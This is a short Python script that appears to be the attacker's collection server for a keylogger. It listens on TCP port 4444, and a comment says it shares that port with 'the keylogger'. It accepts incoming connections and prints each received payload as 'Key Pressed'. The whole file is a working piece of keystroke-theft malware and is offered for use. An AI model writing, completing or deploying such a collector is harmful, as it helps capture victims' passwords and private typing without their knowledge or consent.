import socket


HOST = "0.0.0.0"  
PORT = 4444       # same port as the keylogger

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

print(f"Listening for connections on port {PORT}...")

while True:
    client, addr = s.accept()
    data = client.recv(1024).decode()
    print(f"Key Pressed: {data}")  
    client.close()
